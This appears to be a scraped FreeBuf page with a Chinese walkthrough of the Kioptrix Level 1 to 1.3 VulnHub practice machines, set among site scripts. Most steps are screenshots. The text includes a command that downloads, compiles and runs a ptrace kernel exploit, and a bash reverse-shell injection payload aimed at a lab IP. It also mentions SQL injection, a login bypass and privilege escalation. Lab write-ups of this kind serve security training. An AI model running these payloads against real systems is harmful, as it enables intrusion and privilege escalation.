@@ -1,0 +1,422 @@
+<head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> </head><script src="static/js/header/jquery.min.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/buf/plugins/wp-favorite-posts/wpfp.js?ver=3.6.1" type="text/javascript"></script>
+<script src="static/js/highslide/highslide-with-html.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+jQuery(document).ready(function($) {
+    hs.graphicsDir = "static/buf/plugins/auto-highslide/images/graphics/";
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.addSlideshow({
+        interval: 5000,
+        repeat: true,
+        useControls: true,
+        fixedControls: "fit",
+        overlayOptions: {
+            opacity: 0.75,
+            position: "bottom center",
+            hideOnMouseOut: true
+
+        }
+
+    });
+});
+</script>
+<script language="JavaScript" src="static/buf/plugins/cartpauj-pm/js/script.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/layer.js"></script>
+<script src="static/buf/plugins/simditor/highlight/highlight.pack.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery-2.0.3.min.js"></script>
+<script src="static/buf/themes/freebuf/js/bootstrap.min.js"></script>
+<script src="static/buf/themes/freebuf/js/slider.js?2016022501.1" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/jquery.sticky.js" type="text/javascript"></script>
+<script src="static/js/focus/bjqs-1.3.min.js" type="text/javascript"></script>
+<script src="static/buf/themes/freebuf/js/mosaic.1.0.1.min.js" type="text/javascript"></script>
+<script src="static/js/new/setint.js" type="text/javascript"></script>
+<script src="static/js/colum/swiper-3.4.2.min.js"></script>
+<script type="application/ecmascript">
+    $('.icon-wechat').hover(function(){
+        $('.wechatImgdiv').show()
+    },function(){
+        $('.wechatImgdiv').hide()
+    })
+</script>
+<script src="static/js/header/header.js" type="text/javascript"></script>
+<script>
+		jQuery(window).load(function () {
+			jQuery(".main-header").sticky({topSpacing: 0});
+		});
+	</script>
+<script>
+                    $('.user-detial .test-info').mouseover(function() {
+                        var _title = $(this).find('.text').attr('data-title');
+                        if (_title) {
+                            var str = '<span class="text-title">' + _title + '</span>';
+                            $(this).append(str);
+                        }
+                    }).mouseout(function() {
+                        $('.user-detial .test-info .text-title').remove();
+                    });
+                </script>
+<script type="text/javascript">
+				jQuery("#pagination a").live("click", function () {
+					var _url = jQuery(this).attr("href");
+					jQuery(this).parents("li").addClass("current").blur().parents("#menupage").find("li").not(jQuery(this).parents("li")).removeClass("current");
+					jQuery.ajax({
+						type: "POST",
+						url: _url + "#timeline",
+						success: function (data) {
+							result = jQuery(data).find("#timeline .news_inner");
+							nextHref = jQuery(data).find("#pagination a").attr("href");
+							if (nextHref != undefined) {
+								jQuery("#pagination a").attr("href", nextHref);
+							} else {
+								jQuery("#pagination").remove();
+							}
+							jQuery(function () {
+								if (_url.indexOf("page") < 1) {
+									jQuery("#timeline").html('');
+								}
+								jQuery("#timeline").append(result.fadeIn(200));
+							});
+						}
+					});
+					return false;
+				});
+			</script>
+<script>
+    $('.star_score > a').click(function() {
+        $(this).addClass('active');
+        $(this).siblings().removeClass('active');
+    });
+    $('.star_score > a').hover(function() {
+        $(this).siblings().removeClass('active');
+    });
+    $(document).on('click', function() {
+        $('.bottom_tools .tips-wrap').hide(500);
+    });
+    $('.bottom_tools ul li.fb-tips').click(function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $(this).find('.tips-wrap').toggle(500);
+    });
+    $('.bottom_tools .tips-wrap').click(function(event) {
+        var evt = evt || event;
+        evt.stopPropagation();
+        $(this).show();
+    });
+    $('.feedback').on('click',function () {
+        var content = $('#feedback-content').val();
+        if(!content){
+            $('#feedback-content').focus();
+            $('.feedback-error').text('反馈内容不能为空！').show();
+            return;
+        }
+        var contact = $('#feedback-contact').val();
+        if(!contact){
+            $('#feedback-contact').focus();
+            $('.feedback-error').text('联系方式不能为空！').show();
+            return;
+        }
+        var score = $('.star_score').children('.active').attr('data-id')
+        if(!score){
+            $('.feedback-error').text('给FreeBuf打个分吧！').show();
+            return;
+        }
+        var yzm = $('#yzm').val();
+        var _url = 'static/verify';
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'content':content,'contact':contact,'score':score,'feedback_status':1,'yzm':yzm},
+            success: function (data) {
+                $("#captcha").trigger('click')
+                if(data.code ==200){
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }else {
+                    layer.open({
+                        title: '系统提示',
+                        btnAlign: 'c',
+                        content: data.msg,
+                        area: '278px',
+                    });
+                }
+            },
+        })
+    })
+
+    $(document).on('click', '.appeal-wrap-public .appeal-main', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').show();
+    });
+    $(document).on('click', '.appeal-main .close', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap').hide();
+    });
+    $(document).on('click', '.appeal-main .appeal-footer .btn-sure', function(event) {
+        var evt = event || evt;
+        evt.stopPropagation();
+        $('.appeal-wrap-public').hide();
+    });
+
+    $('.complain').on('click',function () {
+        var _url = 'static/verify';
+        var token = $('#complain_token').val();
+        $.ajax({
+            type: "post",
+            url: _url,
+            data: {'complain_token':token,'complain_status':1},
+            success: function (data) {
+            },
+        })
+    })
+</script>
+<script src="static/js/new/backtop.js"></script>
+<script type="text/javascript">
+jQuery(function(){	
+	jQuery('.tabPanes ul li').click(function(){
+		jQuery(this).addClass('hit').siblings().removeClass('hit');
+		jQuery('.panesl>div:eq('+jQuery(this).index()+')').show().siblings().hide();	
+	})
+	jQuery('.vulbox-nav').click(function(e) { 
+        e.stopPropagation(); 
+    });  
+})
+</script>
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3Fcc53db168808048541c6735ce30421f5' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+jQuery(function() {
+    jQuery(".simditor pre").each(function(i, block){
+        hljs.highlightBlock(block);    
+    });
+    hljs.initHighlightingOnLoad();
+});
+</script>
+<script>
+/* <![CDATA[ */
+var rcGlobal = {
+	serverUrl		:'static',
+	infoTemp		:'%REVIEWER% on %POST%',
+	loadingText		:'Loading',
+	noCommentsText	:'No comments',
+	newestText		:'&laquo; 最新',
+	newerText		:'&laquo; 新一点',
+	olderText		:'旧一点 &raquo;',
+	showContent		:'1',
+	external		:'1',
+	avatarSize		:'32',
+	avatarPosition	:'left',
+	anonymous		:'Anonymous'
+};
+/* ]]> */
+</script>
+<script src="static/js/recentcomments/wp-recentcomments-jquery.js?ver=2.2.3" type="text/javascript"></script>
+
+<link href="static/buf/plugins/wp-favorite-posts/wpfp.css" id="wpfp-css" rel="stylesheet" type="text/css"/>
+<link href="static/css/recentcomments/wp-recentcomments.css?ver=2.2.3" id="wp-recentcomments-css" media="screen" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/gold/assets/css/widget.css?ver=1.3.2.1" id="mycred-widget-css" media="all" rel="stylesheet" type="text/css"/>
+<link href="static/css/highslide/highslide.css" rel="stylesheet" type="text/css"/>
+<link href="static/buf/plugins/cartpauj-pm/style/style.css" rel="stylesheet" type="text/css"/>
+<link href=" static/buf/plugins/simditor/highlight/styles/default.css" rel="stylesheet" type="text/css"/>
+<link href="https://static.freebuf.com/images/favicon.ico" rel="shortcut icon"/>
+<link href="static/css/new/header.css" rel="stylesheet"/>
+<link href="static/css/new/bootstrap.min.css?ver=2016051701" media="screen" rel="stylesheet"/>
+<link href="static/css/new/swiper-3.4.2.min.css" rel="stylesheet" type="text/css"/>
+<link href="static/css/new/style.css?ver=2018112123749359438534" rel="stylesheet" type="text/css"/>
+
+<div id="contenttxt">
+                            <h2>下载地址</h2>
+</p>
+<pre>#Kioptrix: Level 1 (#1)
+
+https://download.vulnhub.com/kioptrix/Kioptrix_Level_1.rar
+
+#Kioptrix: Level 1.1 (#2)
+
+https://download.vulnhub.com/kioptrix/Kioptrix_Level_2-update.rar
+
+#Kioptrix: Level 1.2 (#3)
+
+https://download.vulnhub.com/kioptrix/KVM3.rar
+
+#Kioptrix: Level 1.3 (#4)
+https://download.vulnhub.com/kioptrix/Kioptrix4_vmware.rar</pre>
+<div>
+<div><span style="background-color:transparent;"></span></div>
+</div>
+<h3></h3>
+<h2><span style="background-color:transparent;">实战演练</span></h2>
+<h3>Kioptrix_Level_1<br /></h3>
+<div>查找该靶机的IP为192.168.199.230</div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190307/1551970034_5c812ef2bd6ad.png" src="images/20190307/1551970034_5c812ef2bd6ad.png" width="690" height="196" />扫描端口</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551970034_5c812ef2bd6ad.png" width="690" height="196" />扫描端口</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190307/1551970231_5c812fb758409.png" src="images/20190307/1551970231_5c812fb758409.png" width="690" height="211" />nikto扫到了不起的东西</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551970231_5c812fb758409.png" width="690" height="211" />nikto扫到了不起的东西</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551970424_5c813078831bd.png" width="690" height="181" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190307/1551970493_5c8130bdd0299.png" src="images/20190307/1551970493_5c8130bdd0299.png" width="690" height="164" />试试这两个exp</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551970424_5c813078831bd.png" width="690" height="181" /><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551970493_5c8130bdd0299.png" width="690" height="164" />试试这两个exp</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190307/1551970677_5c8131751b990.png" src="images/20190307/1551970677_5c8131751b990.png" width="690" height="168" />编译报错</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551970677_5c8131751b990.png" width="690" height="168" />编译报错</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190307/1551971057_5c8132f18db5b.png" src="images/20190307/1551971057_5c8132f18db5b.png" width="690" height="333" />安装这个</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551971057_5c8132f18db5b.png" width="690" height="333" />安装这个</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190307/1551971161_5c81335961da6.png" src="images/20190307/1551971161_5c81335961da6.png" width="635" height="252" />发现还是报错，查了一下</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551971161_5c81335961da6.png" width="635" height="252" />发现还是报错，查了一下</div></noscript>
+<div>在764.c里面加入下面几句</div>
+</p>
+<pre>#include &lt;openssl/rc4.h&gt;
+#include &lt;openssl/md5.h&gt;
+
+#define SSL2_MT_ERROR 0
+#define SSL2_MT_CLIENT_FINISHED 3
+#define SSL2_MT_SERVER_HELLO 4
+#define SSL2_MT_SERVER_VERIFY 5
+#define SSL2_MT_SERVER_FINISHED 6
+#define SSL2_MAX_CONNECTION_ID_LENGTH 16<br /></pre>
+<p></p>
+</p>
+<div>就可以编译成功</div>
+<p>这个站好像死了，我们换另外一个网站的
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190307/1551972018_5c8136b2c59c9.png" src="images/20190307/1551972018_5c8136b2c59c9.png" width="690" height="457" />位置在这里624行，修改成下面</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551972018_5c8136b2c59c9.png" width="690" height="457" />位置在这里624行，修改成下面</div></noscript>
+<div><span style="color:rgb(85,85,85);"></span>
+<pre>#define COMMAND2 “unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n”</pre>
+<p></div>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190307/1551972104_5c81370876923.png" src="images/20190307/1551972104_5c81370876923.png" width="690" height="143" />OK，搞定了</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551972104_5c81370876923.png" width="690" height="143" />OK，搞定了</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190307/1551972434_5c8138523b9f4.png" src="images/20190307/1551972434_5c8138523b9f4.png" width="690" height="666" /><br />
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190307/1551972434_5c8138523b9f4.png" width="690" height="666" /><br /></noscript>
+<h3>Kioptrix_Level_1.1</h3>
+<p>扫描网段，找到IP为192.168.199.170</p>
+<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190308/1552039664_5c823ef0180de.png" src="images/20190308/1552039664_5c823ef0180de.png" width="690" height="170" />80端口打开，看看有没有东西</p>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552039664_5c823ef0180de.png" width="690" height="170" />80端口打开，看看有没有东西</p></noscript>
+<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190308/1552048412_5c82611c30158.png" src="images/20190308/1552048412_5c82611c30158.png" width="690" height="263" />有登录框使用万能密码登录一下</p>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552048412_5c82611c30158.png" width="690" height="263" />有登录框使用万能密码登录一下</p></noscript>
+<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190308/1552048683_5c82622b27188.png" src="images/20190308/1552048683_5c82622b27188.png" width="690" height="222" /></p>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552048683_5c82622b27188.png" width="690" height="222" /></p></noscript>
+<p>sqlmap跑了一下，有注入，不过后面有命令执行，就忽略</p>
+<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190308/1552049514_5c82656a2bd6b.png" src="images/20190308/1552049514_5c82656a2bd6b.png" width="690" height="283" /></p>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552049514_5c82656a2bd6b.png" width="690" height="283" /></p></noscript>
+<p>看到这样的套路，就知道有命令执行漏洞</p></div>
+<p><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552048793_5c826299afe86.png" width="690" height="324" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190308/1552048810_5c8262aaba28d.png" src="images/20190308/1552048810_5c8262aaba28d.png" width="690" height="400" />
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552048793_5c826299afe86.png" width="690" height="324" /><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552048810_5c8262aaba28d.png" width="690" height="400" /></noscript>内核版本
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190308/1552048834_5c8262c2e1060.png" src="images/20190308/1552048834_5c8262c2e1060.png" width="690" height="230" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552048834_5c8262c2e1060.png" width="690" height="230" /></div></noscript>
+<div>使用nc监听1234端口，然后在PHP执行下面命令</div>
+<pre>;bash -i &gt;&amp; /dev/tcp/192.168.199.176/1234 0&gt;&amp;1</pre>
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552055565_5c827d0d90408.png" width="690" height="259" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190308/1552055517_5c827cddc2249.png" src="images/20190308/1552055517_5c827cddc2249.png" width="690" height="228" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552055565_5c827d0d90408.png" width="690" height="259" /><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552055517_5c827cddc2249.png" width="690" height="228" /></div></noscript>
+<div>提权</div>
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552055965_5c827e9d7e043.png" width="690" height="181" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190308/1552056007_5c827ec7368e5.png" src="images/20190308/1552056007_5c827ec7368e5.png" width="690" height="47" />提权成功</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552055965_5c827e9d7e043.png" width="690" height="181" /><img style="margin:15px auto;" alt="image.png" src="images/20190308/1552056007_5c827ec7368e5.png" width="690" height="47" />提权成功</div></noscript>
+<h3>Kioptrix_Level_1.2<br /></h3>
+<div>找到靶机的IP是192.168.199.218</div>
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552104258_5c833b42c3250.png" width="690" height="242" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552104413_5c833bdd97997.png" width="690" height="161" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552104695_5c833cf7d8849.png" width="670" height="999" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552104931_5c833de3e4209.png" src="images/20190309/1552104931_5c833de3e4209.png" width="690" height="334" />web系统要做host</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552104258_5c833b42c3250.png" width="690" height="242" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552104413_5c833bdd97997.png" width="690" height="161" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552104695_5c833cf7d8849.png" width="670" height="999" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552104931_5c833de3e4209.png" width="690" height="334" />web系统要做host</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552108059_5c834a1beae31.png" width="690" height="734" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552108167_5c834a87e3b9a.png" src="images/20190309/1552108167_5c834a87e3b9a.png" width="587" height="230" />在web扫了一波注入，找到了这个注入点</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552108059_5c834a1beae31.png" width="690" height="734" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552108167_5c834a87e3b9a.png" width="587" height="230" />在web扫了一波注入，找到了这个注入点</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552108387_5c834b6387f4e.png" src="images/20190309/1552108387_5c834b6387f4e.png" width="690" height="639" />数据库</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552108387_5c834b6387f4e.png" width="690" height="639" />数据库</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552108507_5c834bdb79efc.png" width="690" height="758" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552108596_5c834c344840d.png" width="608" height="230" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552108644_5c834c64cffbc.png" src="images/20190309/1552108644_5c834c64cffbc.png" width="690" height="136" />找到了一些信息</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552108507_5c834bdb79efc.png" width="690" height="758" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552108596_5c834c344840d.png" width="608" height="230" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552108644_5c834c64cffbc.png" width="690" height="136" />找到了一些信息</div></noscript>
+<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552108895_5c834d5f7c9d3.png" src="images/20190309/1552108895_5c834d5f7c9d3.png" width="690" height="266" /><br />
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552108895_5c834d5f7c9d3.png" width="690" height="266" /><br /></noscript>使用这两个账号能够登录进ssh
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552109065_5c834e097cbe0.png" width="690" height="783" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552109328_5c834f10ca1ae.png" width="690" height="153" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552110648_5c835438cc1ea.png" src="images/20190309/1552110648_5c835438cc1ea.png" width="441" height="89" /><a href="https://www.mobilezhao.com/?tag=ht-editor">HT editor</a></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552109065_5c834e097cbe0.png" width="690" height="783" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552109328_5c834f10ca1ae.png" width="690" height="153" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552110648_5c835438cc1ea.png" width="441" height="89" /><a href="https://www.mobilezhao.com/?tag=ht-editor">HT editor</a></div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552109441_5c834f81a4c7f.png" src="images/20190309/1552109441_5c834f81a4c7f.png" width="690" height="194" />按F3，进入到这个文件进行修改，然后按F2保存</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552109441_5c834f81a4c7f.png" width="690" height="194" />按F3，进入到这个文件进行修改，然后按F2保存</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552113857_5c8360c1f0df6.png" src="images/20190309/1552113857_5c8360c1f0df6.png" width="690" height="450" />搞定</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552113857_5c8360c1f0df6.png" width="690" height="450" />搞定</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552113973_5c8361357c23a.png" src="images/20190309/1552113973_5c8361357c23a.png" width="653" height="1007" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552113973_5c8361357c23a.png" width="653" height="1007" /></div></noscript>
+<h3>kioptrix_level 1.3</h3>
+<div>压缩包解压后，发现只有一个虚拟硬盘，需要打开一个虚拟机加入这块硬盘</div>
+<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552116132_5c8369a4755ed.png" src="images/20190309/1552116132_5c8369a4755ed.png" width="570" height="546" />
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552116132_5c8369a4755ed.png" width="570" height="546" /></noscript>把原来的硬盘删掉，添加这块硬盘
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552116187_5c8369db207fa.png" src="images/20190309/1552116187_5c8369db207fa.png" width="690" height="674" />增加成功</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552116187_5c8369db207fa.png" width="690" height="674" />增加成功</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552116256_5c836a20f18be.png" src="images/20190309/1552116256_5c836a20f18be.png" width="690" height="616" />扫描到靶机的IP是192.168.199.100</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552116256_5c836a20f18be.png" width="690" height="616" />扫描到靶机的IP是192.168.199.100</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552116479_5c836aff756d0.png" width="690" height="214" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552116719_5c836bef4c8b9.png" width="690" height="239" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552116900_5c836ca421208.png" src="images/20190309/1552116900_5c836ca421208.png" width="690" height="433" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552116479_5c836aff756d0.png" width="690" height="214" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552116719_5c836bef4c8b9.png" width="690" height="239" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552116900_5c836ca421208.png" width="690" height="433" /></div></noscript>
+<div>找到了几个用户</div>
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552118545_5c8373118d14d.png" width="690" height="185" />扫描web目录<br /><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552117017_5c836d194f6fe.png" src="images/20190309/1552117017_5c836d194f6fe.png" width="580" height="679" />进入到web系统，发现有登录框，测试发现使用上面扫描到用户，可以爆出来用户密码</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552118545_5c8373118d14d.png" width="690" height="185" />扫描web目录<br /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552117017_5c836d194f6fe.png" width="580" height="679" />进入到web系统，发现有登录框，测试发现使用上面扫描到用户，可以爆出来用户密码</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552119092_5c8375345f7e9.png" src="images/20190309/1552119092_5c8375345f7e9.png" width="461" height="431" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552119092_5c8375345f7e9.png" width="461" height="431" /></div></noscript>
+<p><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552119109_5c837545f198a.png" src="images/20190309/1552119109_5c837545f198a.png" width="614" height="235" />
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552119109_5c837545f198a.png" width="614" height="235" /></noscript>使用ssh登录进去
+<div><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552119282_5c8375f2b2d41.png" width="690" height="511" /><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552119382_5c8376569eed3.png" src="images/20190309/1552119382_5c8376569eed3.png" width="690" height="640" />使用mysql提权</div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552119282_5c8375f2b2d41.png" width="690" height="511" /><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552119382_5c8376569eed3.png" width="690" height="640" />使用mysql提权</div></noscript>
+<div><img style="margin:15px auto;" alt="image.png" data-original="images/20190309/1552119575_5c837717b3e9a.png" src="images/20190309/1552119575_5c837717b3e9a.png" width="675" height="433" /></div>
+<noscript><img style="margin:15px auto;" alt="image.png" src="images/20190309/1552119575_5c837717b3e9a.png" width="675" height="433" /></div></noscript>
+                                
+                                <div class="column-support">
+                                    <p class="support-mount good_num"></p>
+                                    <a href="javascript:void (0);" data-status="0" data-id="197647" class="good"></a>
+                                </div>
+                                <script>
+                                    $('.good').on('click',function () {
+                                        var login = $(this).attr('data-status');
+                                        if(login){
+                                            var token = $('#token').val();
+                                            var id = $(this).attr('data-id');
+                                            var good = $('.good_num').text();
+                                            var _this = $(this);
+                                            var _url = document.location.href;
+                                            $.ajax({
+                                                type: "post",
+                                                url: _url,
+                                                data: {'token':token,'id':id, 'good':1},
+                                                success: function (data) {
+                                                    $('#token').val(data.token);
+                                                    if(data.code ==400){
+                                                        layer.open({
+                                                            title: '系统提示',
+                                                            btnAlign: 'c',
+                                                            content: data.msg,
+                                                            area: '278px',
+                                                        });
+                                                    }else {
+                                                        if(good){
+                                                            good++;
+                                                        }else {
+                                                            good=1;
+                                                        }
+                                                        $('.good_num').text(good);
+                                                        _this.disabled();
+                                                    }
+                                                },
+                                            })
+                                        }else {
+                                            layer.open({
+                                                title: '系统提示',
+                                                btnAlign: 'c',
+                                                content: '请先登录',
+                                                btn: ['登录'],
+                                                area: '278px',
+                                                yes: function () {
+                                                    login();
+                                                },
+                                            });
+                                        }
+                                        return false;
+                                    })
+                                    function login(){
+                                        window.location.href = 'https//www.freebuf.com/oauth';
+                                    }
+                                </script>
+                                                    </div>
+                        <div class="wechatcodeDiv">
